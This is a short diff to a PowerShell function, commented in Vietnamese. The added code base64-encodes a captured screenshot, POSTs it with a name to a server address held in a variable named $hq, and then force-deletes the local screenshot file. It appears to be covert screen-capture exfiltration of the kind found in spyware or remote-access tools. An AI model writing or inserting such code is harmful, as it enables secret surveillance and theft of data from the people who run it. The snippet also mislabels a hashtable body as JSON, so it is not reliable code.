@@ -24,7 +24,25 @@ function info {
 
     $graphics.Dispose()
     $bitmap.Dispose()
+    
+ # Chuẩn bị nội dung để gửi
+    $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
+    $encodedScreenshot = [Convert]::ToBase64String($fileContent)
+    $body = @{
+        name = $name
+        screenshot = $encodedScreenshot
+    }
 
+    # Gửi thông tin qua POST request
+    try {
+        Invoke-WebRequest -Uri $hq -Method POST -Body $body -ContentType "application/json"
+        Write-Host "Thông tin đã được gửi thành công."
+    } catch {
+        Write-Host "Lỗi khi gửi thông tin: $_"
+    }
+
+    # Xóa file tạm
+    Remove-Item -Path $screenshotPath -Force
    
 }
 
